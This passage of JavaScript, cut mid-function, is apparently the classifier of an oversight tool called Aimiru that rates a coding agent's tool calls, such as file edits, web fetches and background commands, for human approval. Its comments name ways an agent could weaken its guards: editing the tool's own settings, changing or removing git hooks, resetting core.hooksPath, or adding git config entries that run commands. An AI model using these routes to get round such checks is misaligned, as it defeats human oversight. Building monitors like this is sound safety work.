    if (c.checkout) extra = { checkout: c.checkout, ...(c.amount != null ? { amount: c.amount } : {}), ...(c.currency ? { currency: c.currency } : {}) };
  } else if (['Write', 'Edit', 'MultiEdit', 'NotebookEdit'].includes(toolName)) {
    const raw = ti.file_path ?? ti.notebook_path ?? ti.path ?? '';
    const p = raw ? path.resolve(ctx.cwd, String(raw).replace(/^~(?=$|\/)/, ctx.home)) : null;
    const verb = toolName === 'Write' ? 'Write' : 'Edit';
    if (p && isProtectedPath(p, ctx)) {
      // The maker's settings or Aimiru's own files (CONTRACT.md, the protected-paths row): named as a
      // git guard's removal is, asked about, and held when Aimiru cannot be asked.
      cls = 'delete';
      resource = INCIDENT_RESOURCES.removeGuard;
      sensitive = true;
      description = `${verb} Claude Code or Aimiru settings: ${p}`;
    } else if (p && isGitGuardPath(p) && existingGuardFile(p)) {
      // Changing a git guard that is there can turn it off (ADR-0111): never local work. Writing a
      // new hook where none is installs a guard, which stays local work, as it is from the shell.
      cls = 'delete';
      resource = INCIDENT_RESOURCES.removeGuard;
      sensitive = true;
      description = `${verb} ${rel(p, ctx)}`;
    } else if (p && isGitConfigPath(p) && settingsEditTouchesHooksPath(toolName, ti, p)) {
      // Setting or taking away core.hooksPath in a git settings file changes where git takes its
      // guards from (ADR-0111 review): never local work, as "git config core.hooksPath" is not.
      cls = 'delete';
      resource = INCIDENT_RESOURCES.removeGuard;
      sensitive = true;
      description = `${verb} ${rel(p, ctx)}`;
    } else if (p && isGitConfigPath(p)) {
      // Any other change to a git settings file can make git run commands (an include, an
      // fsmonitor, an sshCommand), so it is never local work either (ADR-0111 review).
      cls = 'other';
      description = `${verb} ${rel(p, ctx)}`;
    } else if (p && isInsideWorkArea(p, ctx)) {
      cls = 'read';
      resource = LOCAL_WORK_RESOURCE;
      description = `${verb} ${rel(p, ctx)}`;
    } else {
      cls = 'write';
      description = `${verb} a file outside the project: ${p || raw || 'unknown file'}`;
    }
  } else if (toolName === 'WebFetch') {
    // A plain read goes ahead and is recorded: read, net.get, the host. An address that carries
    // data is data leaving for that host (ADR-0146); to this computer it stays other, as before.
    const url = String(ti.url ?? '');
    const target = webTarget(url, { scheme: 'https' });
    if (urlCarriesData(url)) {
      cls = target.local ? 'other' : 'share';
      counterparty = target.local ? counterpartyOf(url) : target.host;
      sensitive = !target.local && !target.host;
    } else if (target.host) {
      cls = 'read';
      resource = WEB_READ_RESOURCE;
      counterparty = target.host;
    } else {
      cls = 'other';
      counterparty = counterpartyOf(url);
    }
    description = `Open ${url}`;
  } else if (toolName === 'WebSearch') {
    cls = 'read';
    description = `Search the web for "${String(ti.query ?? '')}"`;
  } else if (toolName === 'Agent' || toolName === 'Task' || toolName === 'Workflow') {
    // Helpers' own tool calls are checked one by one as they happen.
    cls = 'read';
    description = `Start a helper: ${String(ti.description ?? ti.subagent_type ?? ti.name ?? '')}`;
  } else if (toolName === 'Monitor') {
    // Monitor runs a shell command (or opens a socket) in the background.
    if (typeof ti.command === 'string') {
      const c = classifyCommand(ti.command, ctx);
      cls = c.class;
      counterparty = c.counterparty;
      resource = c.resource;
      sensitive = c.sensitive;
      parts = c.parts || [];
      evidenceInput = shellEvidenceInput(ti);
      description = `Watch with a command: ${ti.command.replace(/\s+/g, ' ').trim()}`;
      if (c.programs) {
        programs = c.programs;
        sandboxOn = c.sandbox === true;
        if (resource === NEW_PROGRAM_RESOURCE) description = withProgramSentence(description, programDescription(c.programs, c.sandbox));
      }
    } else {
      const url = String(ti.ws?.url ?? '');
      cls = 'other';
      counterparty = url ? counterpartyOf(url) : null;
      description = `Watch ${url || 'a stream'}`;
    }
  } else if (toolName === 'RemoteTrigger') {
    const act = String(ti.action ?? '');
    cls = /^(list|get|list_runs|get_run_log)$/.test(act) ? 'read' : 'other';
    description = cls === 'read' ? 'Look at scheduled cloud runs' : `Start or change a scheduled cloud run (${act || 'unknown'})`;
  } else if (splitMcpToolName(toolName)) {
    const { server, tool } = splitMcpToolName(toolName);
    const serverName = input?.mcp_server?.name || server;
    const c = classifyToolName({ server: serverName, tool, args: ti, pathContext: ctx });
    cls = c.class;
    counterparty = c.counterparty;
    resource = c.resource;
    // Held when Aimiru cannot be asked, as the same step from the shell is (isFailClosed).
    sensitive = c.sensitive === true;
    if (c.amount != null) extra = { amount: c.amount, ...(c.currency ? { currency: c.currency } : {}) };
    if (c.checkout) extra.checkout = c.checkout;
    description = `Use ${tool} from ${serverName}`;
  } else if (READ_ONLY_BUILTINS.has(toolName)) {
    cls = 'read';
    description = `Use ${toolName}`;
  } else {
    // A tool this connector does not know (new in Claude Code, or from another plugin): never
    // treated as plain reading. A command or address in its input is read like Bash or WebFetch.
    cls = 'other';
    description = `Use ${toolName}`;
    if (typeof ti.command === 'string') {
      const c = classifyCommand(ti.command, ctx);
      cls = strongest(cls, c.class);
      counterparty = c.counterparty;
      resource = c.resource;
      sensitive = c.sensitive;
      parts = c.parts || [];
      description = `Use ${toolName}: ${ti.command.replace(/\s+/g, ' ').trim()}`;
      if (c.checkout) extra = { checkout: c.checkout, ...(c.amount != null ? { amount: c.amount } : {}), ...(c.currency ? { currency: c.currency } : {}) };
    } else if (typeof ti.url === 'string') {
      counterparty = counterpartyOf(ti.url);
    }
  }

  // The programs' fingerprints are part of the evidence Aimiru hashes, never their text (ADR-0090),
  // ahead of the input, so a long command cut at the evidence's length never cuts them off; so is a
  // keyed MAC of the whole input (ADR-0094), so two commands that differ after the cut never match.
  const programEvidence = programs ? programs.slice(0, 8).map((p) => ({ path: truncate(p.rel, 160), sha256: p.sha256 })) : null;
  const action = {
    class: cls,
    description: truncate(redactSecrets(description), 280),
    evidence: evidenceText(toolName, evidenceInput, { key: opts.evidenceKey, programs: programEvidence, sandbox: sandboxOn }),
    ...(counterparty ? { counterparty: truncate(redactSecrets(counterparty), 200) } : {}),
    ...(resource ? { resource } : {}),
    ...extra,
  };
  if (sensitive) action.sensitive = true;
  if (programs) {
    // Only for this computer: what to remember once the person allows it, and what the receipt names.
    Object.defineProperty(action, 'programs', { value: programs, enumerable: false });
    Object.defineProperty(action, 'sandbox', { value: sandboxOn, enumerable: false });
  }
  if (pushes && (action.class === 'send' || action.class === 'delete')) Object.defineProperty(action, 'pushes', { value: pushes, enumerable: false });
  Object.defineProperty(action, 'neverParts', { value: parts, enumerable: false });
  return action;
}

/** Why a program counts as new, in words for the person (ADR-0090). */
const PROGRAM_WHY = {
  'not in the last commit': 'not in your last commit',
  'changed since the last commit': 'changed since your last commit',
  'scripts changed since the last commit': 'with scripts changed since your last commit',
  'committed during this session': 'committed during this session',
  'not in a repository': 'in a folder with no commits to compare',
  'changed by this same command': 'changed by the same command',
  'changed during this session': 'installed or changed during this session',
  'cannot tell which file runs': 'which Aimiru cannot match to one file',
  'a link': 'a link to another file',
  'too large to read': 'too large for Aimiru to read',
  unreadable: 'which Aimiru could not read',
};

/**
 * The command, then the program sentence (ADR-0090 review): the person sees what runs and with
 * which arguments ("Run a command: python3 migrate.py --env prod. migrate.py, not in your last
 * commit"), within the description's 280 characters, the command shortened first.
 */
export function withProgramSentence(command, sentence) {
  const said = truncate(sentence, 200);
  return `${truncate(command, Math.max(40, 280 - said.length - 2))}. ${said}`;
}

/**
 * The action's words for a command that runs programs the agent wrote: the file, why it is new,
 * and what its text suggests ("scripts/cleanup.js, not in your last commit; it calls
 * api.stripe.com and deletes files or data"). With the sandbox on: "..., inside Claude Code's
 * sandbox" (the agent's own name: "inside Codex's sandbox"). Allowed earlier in this session:
 * "..., unchanged since you allowed it".
 */
export function programDescription(programs, sandbox = false, agent = 'Claude Code') {
  const list = Array.isArray(programs) ? programs : [];
  const fresh = list.filter((p) => !p.remembered);
  const first = fresh[0] || list[0];
  if (!first) return 'a program it wrote';
  const others = (fresh.length || list.length) - 1;
  const names = `${first.rel}${others > 0 ? ` and ${others} more` : ''}`;
  if (!fresh.length) return `${names}, unchanged since you allowed it in this session`;
  const why = PROGRAM_WHY[first.why] || 'not checked against your last commit';
  const where = sandbox ? `, inside ${agent}'s sandbox` : '';
  const seen = [...new Set(fresh.flatMap((p) => (Array.isArray(p.hints) ? p.hints : [])))].slice(0, 3);
  const PLURAL = { calls: 'call', deletes: 'delete', starts: 'start', has: 'have' };
  const said = fresh.length > 1 ? seen.map((h) => h.replace(/^(\w+)/, (v) => PLURAL[v] || v)) : seen;
  const hints = said.length ? `; ${fresh.length > 1 ? 'they' : 'it'} ${joinWords(said)}` : '';
  return `${names}, ${why}${where}${hints}`;
}

function joinWords(words) {
  if (words.length <= 1) return words.join('');
  return `${words.slice(0, -1).join(', ')} and ${words[words.length - 1]}`;
}
